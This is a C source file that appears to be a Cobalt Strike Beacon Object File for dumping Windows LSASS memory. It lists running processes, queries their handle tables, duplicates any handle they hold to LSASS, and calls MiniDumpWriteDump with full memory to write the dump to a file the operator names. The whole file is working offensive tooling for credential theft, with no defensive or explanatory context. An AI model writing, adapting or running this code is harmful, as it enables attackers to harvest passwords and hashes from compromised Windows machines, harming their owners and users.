#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <DbgHelp.h>
#include <intrin.h>
#include "beacon.h"

#define ProcessHandleInformation ((PROCESSINFOCLASS)0x33)
#define MAX_PID_LIST_LEN 1024

#define BEACON_DBGPRINT(x) BeaconPrintf(CALLBACK_OUTPUT, "BEACON: %s\n", x)

/*
Functions:
    GetProcessHeap
    HeapAlloc
    HeapFree
    GetCurrentProcess
    GetProcessId
    OpenProcess
    NtQueryInformationProcess
    DuplicateHandle
    CreateFile
    CreateToolhelp32Snapshot
    Process32First
    MiniDumpWriteDump
    CloseHandle
*/

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess();
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);

DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetProcessId(HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$DuplicateHandle(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$Process32First(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$Process32Next(HANDLE, LPPROCESSENTRY32);

DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtQueryInformationProcess(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

DECLSPEC_IMPORT BOOL WINAPI DBGHELP$MiniDumpWriteDump(HANDLE, DWORD, HANDLE, MINIDUMP_TYPE, LPVOID, LPVOID, LPVOID);

typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO
{
    HANDLE HandleValue;
    ULONG_PTR HandleCount;
    ULONG_PTR PointerCount;
    ULONG GrantedAccess;
    ULONG ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO, *PPROCESS_HANDLE_TABLE_ENTRY_INFO;

// private
typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION
{
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[1];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION, *PPROCESS_HANDLE_SNAPSHOT_INFORMATION;

BOOL doDump(int lsassPid, char *dumpFile);

void go(char *data, int len)
{
    datap parser;
    int lsassPid;

    int strLen;
    char *dumpFile;

    BeaconDataParse(&parser, data, len);
    lsassPid = BeaconDataInt(&parser);
    dumpFile = BeaconDataExtract(&parser, &strLen);

    if (!lsassPid || !strLen)
    {
        return;
    }
    if(doDump(lsassPid, dumpFile)){
        BEACON_DBGPRINT("success");
    } else {
        BEACON_DBGPRINT("fail");
    }
}

BOOL doDump(int lsassPid, char *dumpFile)
{
    if (!BeaconIsAdmin())
    {
        BEACON_DBGPRINT("not admin...");
        return FALSE;
    }
    NTSTATUS ntstatus;
    DWORD *lpdwPidList = NULL;
    DWORD dwSelfPid;
    DWORD dwLastError = 0;
    HANDLE hCurrentProcess;
    HANDLE hToken;
    HANDLE hOutFile;
    HANDLE hForeignProcess;
    HANDLE hSnapshot;
    HANDLE hHeap;
    HANDLE hTargetHandle;
    BOOL status;
    int idx = 0;

    PROCESSENTRY32 procEntry = {0};
    procEntry.dwSize = sizeof(PROCESSENTRY32);
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION lpProcHandleSnapInfo;

    hCurrentProcess = KERNEL32$GetCurrentProcess();
    hSnapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
    hHeap = KERNEL32$GetProcessHeap();
    dwSelfPid = KERNEL32$GetProcessId(hCurrentProcess);

    lpdwPidList = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PID_LIST_LEN * sizeof(DWORD));
    if (!lpdwPidList)
    {
        return FALSE;
    }

    // get a list of all PIDs
    status = KERNEL32$Process32First(hSnapshot, &procEntry);
    if (!status)
    {
        return FALSE;
    }
    while (status && idx < MAX_PID_LIST_LEN) // I'm lazy, todo: not like this
    {
        if (procEntry.th32ProcessID == lsassPid || procEntry.th32ProcessID == dwSelfPid)
        {
            status = KERNEL32$Process32Next(hSnapshot, &procEntry);
            continue;
        }
        lpdwPidList[idx] = procEntry.th32ProcessID;
        status = KERNEL32$Process32Next(hSnapshot, &procEntry);
        idx++;
    }

    // Now that we have a list of all of the PIDs,
    // iterate over all of them, see if they have handles to LSASS
    for (int i = 0; i < idx; i++)
    {
        hForeignProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, FALSE, lpdwPidList[i]);
        if (hForeignProcess == NULL)
        {
            continue;
        }

        unsigned long returnLen = sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION);
        // allocate
        lpProcHandleSnapInfo = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, returnLen);
        if (!lpProcHandleSnapInfo)
        {
            return FALSE;
        }
        // make the first call to get the buffer size
        ntstatus = NTDLL$NtQueryInformationProcess(hForeignProcess, ProcessHandleInformation, lpProcHandleSnapInfo, returnLen, &returnLen);
        if (!NT_SUCCESS(ntstatus))
        {
            KERNEL32$HeapFree(hHeap, 0, lpProcHandleSnapInfo);
            // allocate with the new buffer size
            lpProcHandleSnapInfo = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, returnLen);
            if (!lpProcHandleSnapInfo)
            {
                return FALSE;
            }
        }

        ntstatus = NTDLL$NtQueryInformationProcess(hForeignProcess, ProcessHandleInformation, lpProcHandleSnapInfo, returnLen, &returnLen);
        if (!NT_SUCCESS(ntstatus))
        {
            KERNEL32$HeapFree(hHeap, 0, lpProcHandleSnapInfo);
            KERNEL32$CloseHandle(hForeignProcess);
            continue;
        }

        for (int j = 0; j < lpProcHandleSnapInfo->NumberOfHandles; j++)
        {
            HANDLE hForeignValue = lpProcHandleSnapInfo->Handles[j].HandleValue;

            if (!KERNEL32$DuplicateHandle(hForeignProcess, hForeignValue, hCurrentProcess, &hTargetHandle, PROCESS_QUERY_INFORMATION, FALSE, DUPLICATE_SAME_ACCESS))
            {                              
                continue;
            }
            DWORD dwTargetPid = KERNEL32$GetProcessId(hTargetHandle);
            if(!dwTargetPid){ continue; }

            
            if (dwTargetPid == lsassPid)
            {
                // we found a process with a handle to LSASS 
                // create the dump file and do the damn thing
                hOutFile = KERNEL32$CreateFileA(dumpFile, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if(!hOutFile){
                    BeaconPrintf(CALLBACK_OUTPUT, "create file failed - %d\n", KERNEL32$GetLastError());
                    return FALSE;
                }
                if(!DBGHELP$MiniDumpWriteDump(hTargetHandle, lsassPid, hOutFile, MiniDumpWithFullMemory, NULL, NULL, NULL)){
                    BeaconPrintf(CALLBACK_OUTPUT, "mdwd failed - %d\n", KERNEL32$GetLastError());
                    KERNEL32$CloseHandle(hOutFile);
                    return FALSE;
                }
                KERNEL32$CloseHandle(hOutFile);
                return TRUE;
            }
        }
        KERNEL32$CloseHandle(hForeignProcess);
        KERNEL32$HeapFree(hHeap, 0, lpProcHandleSnapInfo);
    }

    if (lpdwPidList)
    {
        KERNEL32$HeapFree(hHeap, 0, lpdwPidList);
    }

    return FALSE;
}
